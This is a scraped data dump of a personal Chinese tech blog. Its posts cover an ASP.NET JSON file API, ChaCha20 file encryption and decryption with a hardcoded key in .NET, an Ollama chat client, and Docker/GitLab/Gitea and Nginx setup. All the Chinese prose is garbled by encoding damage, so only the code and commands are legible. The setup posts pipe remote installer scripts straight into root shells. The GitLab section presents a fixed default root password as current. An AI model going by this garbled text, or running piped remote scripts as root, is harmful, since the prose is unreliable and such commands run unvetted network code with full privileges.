1234567891011121314151617181920212223242526272829303132333435363738394041using Microsoft.AspNetCore.Mvc;using System.IO;using Newtonsoft.Json;namespace Namespace.Controllers&#123; [ApiController] [Route(&quot;[controller]&quot;)] public class JsonController : ControllerBase &#123; private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;data.json&quot;); // GET: /json [HttpGet] public IActionResult GetJson() &#123; if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(&quot;JSON file not found.&quot;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, &quot;application/json&quot;); &#125; // POST: /json [HttpPost] public IActionResult PostJson([FromBody] DataType data) &#123; var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(&quot;JSON file updated successfully.&quot;); &#125; &#125; public class DataType &#123; // Define JSON structure here public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; &#125;&#125; 2. æ·»åŠ ä¾èµ–é¡¹ packageç¡®ä¿å·²ç»å®‰è£…äº†Newtonsoft.JsonåŒ… 123dotnet add package Newtonsoft.Json 3.é…ç½®æ–‡ä»¶è·¯å¾„åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬å°†JSONæ–‡ä»¶çš„è·¯å¾„è®¾ç½®ä¸ºwwwroot&#x2F;data.json 4. è¿è¡Œé¡¹ç›®å¯åŠ¨ASP.NET Coreåº”ç”¨ç¨‹åºï¼Œå¹¶ä½¿ç”¨å·¥å…·å¦‚Postmanæˆ–æµè§ˆå™¨æµ‹è¯•APIç«¯ç‚¹ã€‚ GETè¯·æ±‚ï¼šhttp://localhost:5000/json POSTè¯·æ±‚ï¼šä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„JSONæ•°æ®å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°http://localhost:5000/jsonï¼š 12345&#123; &quot;name&quot;: &quot;lll&quot;, &quot;age&quot;: 30&#125; DataType classä¹Ÿå¯ä»¥åµŒå¥—å¤šå±‚ æ ¹æ®å®é™…åº”ç”¨æ¥ç¼–å†™","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"json","slug":"json","permalink":"https://banjinmei.github.io/tags/json/"}],"author":"mu"},{"title":".net chacha20 decrypted","slug":"net-chacha20-decrypted","date":"2024-10-15T17:10:02.000Z","updated":"2024-10-15T17:18:44.673Z","comments":true,"path":"2024/10/16/net-chacha20-decrypted/","permalink":"https://banjinmei.github.io/2024/10/16/net-chacha20-decrypted/","excerpt":"","text":".NET å®ç° ChaCha20 åŠ å¯†å’Œè§£å¯† add package1Install-Package BouncyCastle chacha20 helper123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051using Org.BouncyCastle.Crypto;using Org.BouncyCastle.Crypto.Engines;using Org.BouncyCastle.Crypto.Parameters;using System;public class ChaCha20&#123; private readonly byte[] key; private readonly byte[] nonce; // Constructor to initialize key and nonce public ChaCha20(byte[] key, byte[] nonce) &#123; if (key.Length != 32) &#123; throw new ArgumentException(&quot;Key must be 32 bytes (256 bits).&quot;); &#125; if (nonce.Length != 12) &#123; throw new ArgumentException(&quot;Nonce must be 12 bytes (96 bits).&quot;); &#125; this.key = key; this.nonce = nonce; &#125; // Method to encrypt the data using ChaCha20 public byte[] Encrypt(byte[] data, int offset, int count) &#123; return ProcessData(true, data, offset, count); &#125; // Method to decrypt the data using ChaCha20 public byte[] Decrypt(byte[] data, int offset, int count) &#123; return ProcessData(false, data, offset, count); &#125; // Helper method to process encryption/decryption private byte[] ProcessData(bool forEncryption, byte[] data, int offset, int count) &#123; var engine = new ChaCha7539Engine(); // ChaCha20/Poly1305 engine (ChaCha7539) var parameters = new ParametersWithIV(new KeyParameter(key), nonce); engine.Init(forEncryption, parameters); byte[] output = new byte[count]; engine.ProcessBytes(data, offset, count, output, 0); return output; &#125;&#125; å…³é”®ç‚¹è§£é‡Šï¼šChaCha7539Engine: BouncyCastle æä¾›äº† ChaCha7539Engineï¼Œè¿™æ˜¯ ChaCha20 åŠ å¯†ç®—æ³•çš„å®ç°ï¼ˆ96-bit nonceï¼Œ32-byte keyï¼‰ã€‚ProcessData: ProcessData æ–¹æ³•è´Ÿè´£æ‰§è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œå–å†³äºä¼ å…¥çš„ forEncryption å‚æ•°ã€‚åŠ å¯†æ—¶ï¼ŒforEncryption ä¸º trueï¼Œå¦åˆ™ä¸º falseã€‚Key å’Œ Nonce: ChaCha20 ä½¿ç”¨ 32 å­—èŠ‚ï¼ˆ256 ä½ï¼‰çš„å¯†é’¥å’Œ 12 å­—èŠ‚ï¼ˆ96 ä½ï¼‰çš„ nonceã€‚å¦‚æœä¼ å…¥çš„å¯†é’¥æˆ– nonce ä¸ç¬¦åˆé•¿åº¦è¦æ±‚ï¼Œä¼šæŠ›å‡º ArgumentExceptionã€‚Encrypt å’Œ Decrypt: Encrypt å’Œ Decrypt è°ƒç”¨ ProcessData æ¥æ‰§è¡ŒåŠ è§£å¯†ï¼Œåˆ†åˆ«ç”¨äºåŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚è°ƒç”¨ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425public class Program&#123; public static void Main() &#123; // ç¤ºä¾‹å¯†é’¥å’Œ nonce byte[] key = new byte[32] &#123; 0x1E, 0x12, 0x0B, 0x02, 0x05, 0x18, 0x01, 0x13, 0x10, 0x0D, 0x04, 0x06, 0x07, 0x19, 0x09, 0x15, 0x0F, 0x17, 0x08, 0x00, 0x1A, 0x16, 0x1D, 0x14, 0x0E, 0x03, 0x1B, 0x1C, 0x11, 0x0C, 0x1E, 0x1F &#125;; byte[] nonce = new byte[12] &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B &#125;; // è¦åŠ å¯†çš„ç¤ºä¾‹æ•°æ® byte[] plainText = System.Text.Encoding.UTF8.GetBytes(&quot;Hello, ChaCha20 encryption!&quot;); // åŠ å¯† ChaCha20 chacha20 = new ChaCha20(key, nonce); byte[] cipherText = chacha20.Encrypt(plainText, 0, plainText.Length); Console.WriteLine(&quot;Encrypted: &quot; + BitConverter.ToString(cipherText)); // è§£å¯† byte[] decryptedText = chacha20.Decrypt(cipherText, 0, cipherText.Length); Console.WriteLine(&quot;Decrypted: &quot; + System.Text.Encoding.UTF8.GetString(decryptedText)); &#125;&#125; è¾“å‡ºï¼š 12Encrypted: &lt;åŠ å¯†çš„åå…­è¿›åˆ¶å­—èŠ‚ä¸²&gt;Decrypted: Hello, ChaCha20 encryption! é€šè¿‡CHACHA2åŠ è§£å¯†æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102public class FileEncryptorHelper&#123; // ç”Ÿæˆéšæœºçš„ Nonceï¼ˆ12å­—èŠ‚ï¼‰ private byte[] GenerateRandomNonce() &#123; byte[] nonce = new byte[12]; // 12å­—èŠ‚çš„Nonce using (var rng = RandomNumberGenerator.Create()) &#123; rng.GetBytes(nonce); &#125; return nonce; &#125; // ç”Ÿæˆå›ºå®šçš„ Keyï¼ˆ32å­—èŠ‚ï¼‰ private byte[] GenerateKey() &#123; // ä½¿ç”¨å›ºå®šçš„ 256 ä½ï¼ˆ32 å­—èŠ‚ï¼‰çš„å¯†é’¥ return new byte[] &#123; 0x1E, 0x12, 0x0B, 0x02, 0x05, 0x18, 0x01, 0x13, 0x10, 0x0D, 0x04, 0x06, 0x07, 0x19, 0x09, 0x15, 0x0F, 0x17, 0x08, 0x00, 0x1A, 0x16, 0x1D, 0x14, 0x0E, 0x03, 0x1B, 0x1C, 0x11, 0x0C, 0x1E, 0x1F &#125;; &#125; // åŠ å¯†æ–‡ä»¶ æ¯4096 public void EncryptFile(string inputPath, string outputPath, int blockSize = 4096) &#123; byte[] nonce = GenerateRandomNonce(); byte[] key = GenerateKey(); EncryptFile(inputPath, outputPath, key, nonce, blockSize); &#125; // ä½¿ç”¨éšæœºç”Ÿæˆçš„ Nonce å’Œå›ºå®šçš„ Key è¿›è¡Œ ChaCha20 åŠ å¯† public void EncryptFile(string inputPath, string outputPath, byte[] key, byte[] nonce, int blockSize) &#123; if (!File.Exists(outputPath)) &#123; File.Create(outputPath).Dispose(); &#125; using (var inputFile = File.OpenRead(inputPath)) using (var outputFile = File.OpenWrite(outputPath)) &#123; // å°† nonce å†™å…¥è¾“å‡ºæ–‡ä»¶çš„å¼€å¤´ outputFile.Write(nonce, 0, nonce.Length); using (var chacha20 = new MyCC20(key, nonce)) &#123; byte[] buffer = new byte[blockSize]; int bytesRead; // é€å—è¯»å–æ–‡ä»¶å†…å®¹å¹¶åŠ å¯† while ((bytesRead = inputFile.Read(buffer, 0, blockSize)) &gt; 0) &#123; byte[] encryptedData = chacha20.EncryptBytes(buffer, bytesRead); outputFile.Write(encryptedData, 0, encryptedData.Length); &#125; &#125; &#125; Console.WriteLine(&quot;File encrypted successfully: &quot; + outputPath); &#125; // è§£å¯†æ–‡ä»¶ public void DecryptFile(string inputPath, string outputPath, int blockSize = 4096) &#123; if (!File.Exists(outputPath)) &#123; File.Create(outputPath).Dispose(); &#125; using (var inputFile = File.OpenRead(inputPath)) using (var outputFile = File.OpenWrite(outputPath)) &#123; // ä»è¾“å…¥æ–‡ä»¶çš„å¼€å¤´è¯»å– nonce byte[] nonce = new byte[12]; int nonceRead = inputFile.Read(nonce, 0, nonce.Length); if (nonceRead != 12) throw new Exception(&quot;Invalid nonce&quot;); byte[] key = GenerateKey(); using (var chacha20 = new MyCC20(key, nonce)) &#123; byte[] buffer = new byte[blockSize]; int bytesRead; // é€å—è¯»å–æ–‡ä»¶å†…å®¹å¹¶è§£å¯† while ((bytesRead = inputFile.Read(buffer, 0, blockSize)) &gt; 0) &#123; byte[] decryptedData = chacha20.DecryptBytes(buffer, bytesRead); outputFile.Write(decryptedData, 0, decryptedData.Length); &#125; &#125; &#125; Console.WriteLine(&quot;File decrypted successfully: &quot; + outputPath); &#125;&#125; è°ƒç”¨ 1234567891011121314151617try&#123; // åˆ›å»º FileEncryptorHelper å¯¹è±¡ FileEncryptorHelper fileEncryptor = new FileEncryptorHelper(); // æŒ‡å®šåŠ å¯†æ–‡ä»¶è·¯å¾„å’Œè§£å¯†åçš„è¾“å‡ºæ–‡ä»¶è·¯å¾„ string encryptedFilePath = &quot;13632AE2-354E-45B8-9BBA-D474005B5DBC.data&quot;; // åŠ å¯†æ–‡ä»¶è·¯å¾„ &quot;http://8xxx4:8080/group1/110/13632AE2-354E-45B8-9BBA-D474005B5DBC.data&quot;;// string decryptedFilePath = &quot;decryptedFile3.png&quot;; // è§£å¯†åçš„æ–‡ä»¶è·¯å¾„ // è°ƒç”¨è§£å¯†æ–¹æ³• fileEncryptor.DecryptFile(encryptedFilePath, decryptedFilePath); Console.WriteLine(&quot;æ–‡ä»¶è§£å¯†æˆåŠŸï¼&quot;);&#125;catch (Exception ex)&#123; Console.WriteLine(&quot;æ–‡ä»¶è§£å¯†å¤±è´¥: &quot; + ex.Message);&#125; è¾“å‡º 1234&#123;&quot;5&quot;:&quot;\\/group1\\/110\\/13632AE2-354E-45B8-9BBA-D474005B5DBC.data&quot;&#125;Str5 : /group1/110/13632AE2-354E-45B8-9BBA-D474005B5DBC.dataFile decrypted successfully: decryptedFile3.pngæ–‡ä»¶è§£å¯†æˆåŠŸï¼ åŒç†è§£å¯†éŸ³é¢‘æ–‡ä»¶ 1234xxx93EC685A2D41.dataFile decrypted successfully: decryptedFileaac.aacæ–‡ä»¶è§£å¯†æˆåŠŸï¼ mp4è§†é¢‘åŒç†","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"chacha20","slug":"chacha20","permalink":"https://banjinmei.github.io/tags/chacha20/"}],"author":"mu"},{"title":".net local LLM","slug":"net-local-LLM","date":"2024-10-15T16:11:42.000Z","updated":"2024-10-15T16:42:19.011Z","comments":true,"path":"2024/10/16/net-local-LLM/","permalink":"https://banjinmei.github.io/2024/10/16/net-local-LLM/","excerpt":"","text":"ollama1ollama --version æ¯”è¾ƒå¸¸ç”¨çš„æŒ‡ä»¤ä¸å¤šï¼Œä¹Ÿå¾ˆç®€å•åˆ—å‡ºæœ¬åœ°ä¸‹è½½çš„æ¨¡å‹ 1ollama list æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„æ¨¡å‹ 1ollama ps æ¨¡å‹æ ‡è¯†ä¸‹è½½æ¨¡å‹åˆ°æœ¬åœ° 1ollama pull æ¯”å¦‚æˆ‘è¦ä¸‹è½½llama2-chinese:7båˆ™ä½¿ç”¨ 1ollama pull llama2-chinese:7b æ¨¡å‹æ ‡è¯†è¿è¡Œæ¨¡å‹ï¼Œå¦‚æœå·²ä¸‹è½½åˆ™ç›´æ¥è¿è¡Œï¼Œå¦‚æœæ²¡ä¸‹è½½åˆ™å…ˆä¸‹è½½å†è¿è¡Œã€‚ 1ollama run æ¯”å¦‚æˆ‘è¦è¿è¡Œllama2-chinese:7bå¯ä»¥ç›´æ¥è¿è¡Œ 1ollama run llama2-chinese:7b .net package1dotnet add package Ollama --version 1.9.0 1234567891011121314151617181920212223//æ¨¡å‹åç§°æ˜¯å¿…é¡»è¦ä¼ é€’çš„ï¼Œé»˜è®¤ æµå¼è¾“å‡º,å¦‚æœæƒ³ä¸€æ¬¡è¿”å›åŒæ ·çš„æ˜¯è®¾ç½®streamä¸ºfalseã€‚ string modelName = &quot;llama2-chinese:7b&quot;; using var ollama = new OllamaApiClient(baseUri: new Uri(&quot;http://127.0.0.1:11434/api&quot;)); Console.WriteLine(&quot;begin~~~&quot;); string userInput = &quot;&quot;; do &#123; Console.WriteLine(&quot;User:&quot;); userInput = Console.ReadLine()!; var enumerable = ollama.Completions.GenerateCompletionAsync(modelName, userInput); Console.WriteLine(&quot;Agent:&quot;); await foreach (var response in enumerable) &#123; Console.Write($&quot;&#123;response.Response&#125;&quot;); &#125; Console.WriteLine(); &#125; while (!string.Equals(userInput, &quot;exit&quot;, StringComparison.OrdinalIgnoreCase)); Console.WriteLine(&quot;end~~~&quot;);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"LLM","slug":"LLM","permalink":"https://banjinmei.github.io/tags/LLM/"},{"name":"ollama","slug":"ollama","permalink":"https://banjinmei.github.io/tags/ollama/"}],"author":"mu"},{"title":"debian docker gitlab gitea","slug":"debian-docker-gitlab-gitea","date":"2024-10-15T15:57:02.000Z","updated":"2024-11-03T17:45:42.784Z","comments":true,"path":"2024/10/15/debian-docker-gitlab-gitea/","permalink":"https://banjinmei.github.io/2024/10/15/debian-docker-gitlab-gitea/","excerpt":"","text":"ä½¿ç”¨dockeréƒ¨ç½²ç§æœ‰åŒ–ä»£ç ç®¡ç†~ docker12curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh å›½å†…dockeræ›´æ–°ç³»ç»ŸåŒ…ç´¢å¼• 1sudo apt update å®‰è£…ä¸€äº›å¿…è¦çš„åŒ…ï¼Œä»¥ä¾¿äºåç»­æ·»åŠ  apt ä»“åº“ï¼š 1sudo apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common æ·»åŠ é˜¿é‡Œäº‘å¯†é’¥æ·»åŠ  GPG å¯†é’¥æ˜¯ä¸ºäº†ç¡®ä¿è½¯ä»¶åŒ…çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ï¼Œé¿å…å®‰è£…è¿‡ç¨‹ä¸­çš„æ½œåœ¨é—®é¢˜ã€‚å»ºè®®å°½é‡æ‰§è¡Œè¿™ä¸€æ­¥ï¼Œä»¥ç¡®ä¿å®‰è£…è¿‡ç¨‹é¡ºåˆ©è¿›è¡Œã€‚ 1curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo apt-key add - è®¾ç½®é˜¿é‡Œäº‘dockerä»“åº“ 1sudo add-apt-repository &quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/debian $(lsb_release -cs) stable&quot; å†æ¬¡æ›´æ–°ä¸‹ç³»ç»ŸåŒ…çš„ç´¢å¼• 1sudo apt update å®‰è£…docker 1sudo apt install -y docker-ce å¯åŠ¨å¹¶è®¾ç½®dockerçš„å¼€æœºè‡ªå¯åŠ¨ 12sudo systemctl start dockersudo systemctl enable docker æŸ¥çœ‹ä¸‹dockeræ˜¯å¦å®‰è£…æˆåŠŸ 1sudo docker version æœ€åé…ç½®dockerçš„é•œåƒåŠ é€Ÿæ¨èé˜¿é‡Œäº‘çš„ç½‘å€https://cr.console.aliyun.com/us-west-1/instances/mirrors gitlab123456docker run --name &quot;my-gitlab&quot; \\ --hostname &quot;my-gitlab&quot; \\ -p 80:80 \\ --restart unless-stopped \\ -d gitlab/gitlab-ce:latest é»˜è®¤ç”¨æˆ·å: rooté»˜è®¤å¯†ç : 5iveL!fe 12345docker exec -it my-gitlab bashcat /etc/gitlab/initial_root_passwordPassword: 5iveL!fe ä¿®æ”¹é»˜è®¤å¯†ç é¦–æ¬¡ç™»å½• GitLab åï¼Œå»ºè®®ç«‹å³æ›´æ”¹é»˜è®¤å¯†ç ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤è¿›è¡Œï¼š ç™»å½• GitLab Web ç•Œé¢ï¼Œä½¿ç”¨ root ä½œä¸ºç”¨æˆ·åå’Œé»˜è®¤å¯†ç ã€‚ç™»å½•åï¼Œç‚¹å‡»å³ä¸Šè§’çš„å¤´åƒï¼Œé€‰æ‹© Settingsã€‚åœ¨ User Settings é¡µé¢ï¼Œé€‰æ‹© Passwordã€‚è¾“å…¥å½“å‰å¯†ç å’Œæ–°å¯†ç ï¼Œç„¶åç‚¹å‡» Save passwordã€‚é€šè¿‡è¿™äº›æ­¥éª¤ï¼Œä½ å¯ä»¥å®‰å…¨åœ°ç®¡ç† GitLab çš„é»˜è®¤è´¦å·å’Œå¯†ç ï¼Œç¡®ä¿ç³»ç»Ÿçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§ã€‚ ç”¨æˆ·åï¼šmå¯†ç ï¼šxxx URL:http://xxx:9090/ gitå‘½ä»¤ 12345678910111213# input user pwd git clone http://xxx/dev/xx.git git config â€“global user.emailgit config â€“global user.name #æ·»åŠ åˆ°æš‚å­˜åŒºgit add .#æ¨é€ï¼Œæäº¤æ›´æ”¹git commit -m â€œè¿™æ˜¯ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶â€#æ¨é€æ›´æ”¹åˆ°gitlabgit push Gitea 123456docker pull gitea/gitea:latestmkdir -p /var/lib/giteadocker run -d --name=gitea -p 10022:22 -p 80:3000 -v /var/lib/gitea:/data gitea/gitea:latest è®¿é—®80 å®Œæˆåˆå§‹åŒ– åˆå§‹åŒ–å®Œå³å¯ä½¿ç”¨","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"gitea","slug":"gitea","permalink":"https://banjinmei.github.io/tags/gitea/"},{"name":"gitlab","slug":"gitlab","permalink":"https://banjinmei.github.io/tags/gitlab/"}],"author":"mu"},{"title":"nginx domain 4 nodeserver","slug":"nginx-domain-4-nodeserver","date":"2024-10-09T12:36:34.000Z","updated":"2025-01-27T10:14:08.445Z","comments":true,"path":"2024/10/09/nginx-domain-4-nodeserver/","permalink":"https://banjinmei.github.io/2024/10/09/nginx-domain-4-nodeserver/","excerpt":"","text":"å®‰è£…äº† Nginx1234sudo apt updatesudo apt install nginx node1234curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -sudo apt-get install -y nodejsnode -vnpm -v 12345678910111213141516//testwebside const http = require(&#x27;http&#x27;); const hostname = &#x27;0.0.0.0&#x27;; //127001const port = 8080; const server = http.createServer((req, res) =&gt; &#123; res.statusCode = 200; res.setHeader(&#x27;Content-Type&#x27;, &#x27;text/plain&#x27;); res.end(&#x27;Hello World 8080 \\n&#x27;);&#125;); server.listen(port, hostname, () =&gt; &#123; console.log(`Server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`);&#125;); 9090const port &#x3D; 9090; 12345678# pm2 nodenpm install pm2 -gnohup node n80.js &gt; n80.log 2&gt;&amp;1 &amp;nohup node n90.js &gt; n90.log 2&gt;&amp;1 &amp; æˆ– pm2 é…ç½® Node.js åº”ç”¨å‡è®¾ä½ æœ‰ä¸¤ä¸ª Node.js åº”ç”¨ï¼Œåˆ†åˆ«ç›‘å¬åœ¨ç«¯å£ 8080ï¼ˆn80.jsï¼‰ å’Œ 9090ï¼ˆn90.jsï¼‰ã€‚ ç¡®ä¿ Node.js åº”ç”¨å·²ç»å¯åŠ¨å¹¶åˆ†åˆ«ç›‘å¬è¿™ä¸¤ä¸ªç«¯å£ã€‚ä½ å¯ä»¥ç”¨ pm2 æˆ– forever æ¥ç®¡ç† Node.js åº”ç”¨çš„å¯åŠ¨ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ pm2 å¯åŠ¨åº”ç”¨ï¼š 12pm2 start n80.js --name n80-apppm2 start n90.js --name n90-app Nginx é…ç½®ç¼–è¾‘æˆ–åˆ›å»ºä½ è‡ªå·±çš„ Nginx é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸åœ¨ &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F; ä¸‹ã€‚ é…ç½®ç¤ºä¾‹ï¼šä½ éœ€è¦ä¸ºä¸¤ä¸ªä¸åŒçš„åŸŸåï¼ˆæˆ–å­åŸŸåï¼‰é…ç½®ä¸¤ä¸ª server å—ã€‚ 1sudo nano /etc/nginx/sites-available/my-apps Nginx é…ç½®æ–‡ä»¶ï¼š é…ç½®ç¬¬ä¸€ä¸ªåŸŸå w1.xxx.com ç»‘å®šåˆ°ç«¯å£ 8080123456789101112server &#123; listen 80; server_name w1.xxx.com; location / &#123; proxy_pass http://127.0.0.1:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; é…ç½®ç¬¬äºŒä¸ªåŸŸå w2.xxx.com ç»‘å®šåˆ°ç«¯å£ 9090123456789101112server &#123; listen 80; server_name w2.xxx.com; location / &#123; proxy_pass http://127.0.0.1:9090; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; è¿™ä¸ªé…ç½®æ–‡ä»¶å°†ä½¿ w1.xxx.com æŒ‡å‘ç¬¬ä¸€ä¸ªåº”ç”¨ï¼ˆç›‘å¬ç«¯å£ 8080 çš„ n80.jsï¼‰ï¼Œè€Œ w2.xxx.com æŒ‡å‘ç¬¬äºŒä¸ªåº”ç”¨ï¼ˆç›‘å¬ç«¯å£ 9090 çš„ n90.jsï¼‰ã€‚ å¯ç”¨ Nginx é…ç½®å°†é…ç½®æ–‡ä»¶é“¾æ¥åˆ° sites-enabled ç›®å½•å¹¶é‡å¯ Nginxï¼š 1234sudo ln -s /etc/nginx/sites-available/my-apps /etc/nginx/sites-enabled/sudo nginx -t # æµ‹è¯•é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®sudo systemctl restart nginx # é‡å¯ Nginx DNS é…ç½® &#x2F; åŸŸåè§£æç¡®ä¿ä½ å·²ç»å°† w1.xxx.com å’Œ w2.xxx.com çš„ DNS é…ç½®æŒ‡å‘æœåŠ¡å™¨çš„ IP åœ°å€ã€‚ æµ‹è¯• è®¿é—® w1.xxx.com &#x3D;&#x3D; n80.js Hello World 8080 è€Œè®¿é—®w2.xxx.com &#x3D;&#x3D; n90.jsã€‚ Hello World 9090 Nginx æ—¥å¿—ï¼š 12tail -f /var/log/nginx/error.log","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"nginx","slug":"nginx","permalink":"https://banjinmei.github.io/tags/nginx/"}],"author":"mu"},{"title":".NET build release 4 linux","slug":"NET-build-release-4-linux","date":"2024-09-29T03:52:15.000Z","updated":"2024-11-10T13:08:36.384Z","comments":true,"path":"2024/09/29/NET-build-release-4-linux/","permalink":"https://banjinmei.github.io/2024/09/29/NET-build-release-4-linux/","excerpt":"","text":"åœ¨é¡¹ç›®ä¸­ä½¿ç”¨ dotnet publish å‘½ä»¤æ¥å‘å¸ƒåº”ç”¨ç¨‹åºã€‚ å°†å‘å¸ƒçš„åº”ç”¨ç¨‹åºæ–‡ä»¶å¤¹å¤åˆ¶åˆ° Linux æœåŠ¡å™¨ä¸Šã€‚ åœ¨ Linux æœåŠ¡å™¨ä¸Šå®‰è£… .NET è¿è¡Œæ—¶ï¼Œå¦‚æœåº”ç”¨æ˜¯ self-containedï¼ˆç‹¬ç«‹éƒ¨ç½²ï¼‰çš„ã€‚ ä½¿ç”¨ systemd åˆ›å»ºä¸€ä¸ªæœåŠ¡å•å…ƒæ–‡ä»¶æ¥ç®¡ç†åº”ç”¨ä½œä¸ºæœåŠ¡è¿è¡Œã€‚ å¯åŠ¨åº”ç”¨ç¨‹åºæœåŠ¡ã€‚ å‘å¸ƒåº”ç”¨ç¨‹åºï¼š 1dotnet publish -c Release -o ./publish å°†å‘å¸ƒæ–‡ä»¶å¤¹å¤åˆ¶åˆ° Linux æœåŠ¡å™¨ï¼š 1scp -r ./publish [user]@[host]:/var/www/myapp è¿è¡Œ 1dotnet myapp.dll åˆ›å»º systemd æœåŠ¡æ–‡ä»¶ &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;myapp.serviceï¼š 1234567891011121314[Unit]Description=My .NET App [Service]WorkingDirectory=/var/www/myappExecStart=/var/www/myapp/MyAppRestart=alwaysRestartSec=10SyslogIdentifier=dotnet-myappUser=www-dataEnvironment=ASPNETCORE_ENVIRONMENT=Production [Install]WantedBy=multi-user.target å¯åŠ¨æœåŠ¡ï¼š 123sudo systemctl enable myapp.servicesudo systemctl start myapp.service ç¡®ä¿åº”ç”¨ç¨‹åºé…ç½®äº†æ­£ç¡®çš„ç«¯å£ç›‘å¬å’Œé˜²ç«å¢™è§„åˆ™ã€‚ api wr wwwroot json 123456789101112131415161718192021222324252627282930313233343536373839404142using Microsoft.AspNetCore.Mvc;using System.IO;using Newtonsoft.Json;namespace MNamespace.Controllers&#123; [ApiController] [Route(&quot;[controller]&quot;)] public class JsonController : ControllerBase &#123; //wwwroot/data.json private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;data.json&quot;); // GET: /json [HttpGet] public IActionResult GetJson() &#123; if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(&quot;JSON file not found.&quot;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, &quot;application/json&quot;); &#125; // POST: /json [HttpPost] public IActionResult PostJson([FromBody] MDataType data) &#123; var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(&quot;JSON file updated successfully.&quot;); &#125; &#125; public class MDataType &#123; // Define M JSON structure here public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; &#125;&#125; Newtonsoft.Json GETè¯·æ±‚ï¼šhttp://localhost:5000/json POSTè¯·æ±‚ï¼šä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„JSONæ•°æ®å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°http://localhost:5000/jsonï¼š 12345Copy Code&#123; &quot;name&quot;: &quot;m&quot;, &quot;age&quot;: 30&#125; å†™å…¥ 123456789101112131415161718192021222324252627282930313233343536373839404142 using Microsoft.AspNetCore.Mvc;using System.IO;using Newtonsoft.Json;namespace MNamespace.Controllers&#123; [ApiController] [Route(&quot;[controller]&quot;)] public class JsonController : ControllerBase &#123; private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;data.json&quot;); // GET: /json [HttpGet] public IActionResult GetJson() &#123; if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(&quot;JSON file not found.&quot;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, &quot;application/json&quot;); &#125; // POST: /json [HttpPost] public IActionResult PostJson([FromBody] MDataType data) &#123; var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(&quot;JSON file updated successfully.&quot;); &#125; &#125; public class MDataType &#123; // Define M JSON structure here public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; &#125;&#125; å‘å¸ƒæ‰€æœ‰ dotnet publish -c Release -o .&#x2F;publish MySolution&#x2F;â”‚â”œâ”€â”€ MyProjectA&#x2F;â”‚ â””â”€â”€ MyProjectA.csprojâ”œâ”€â”€ 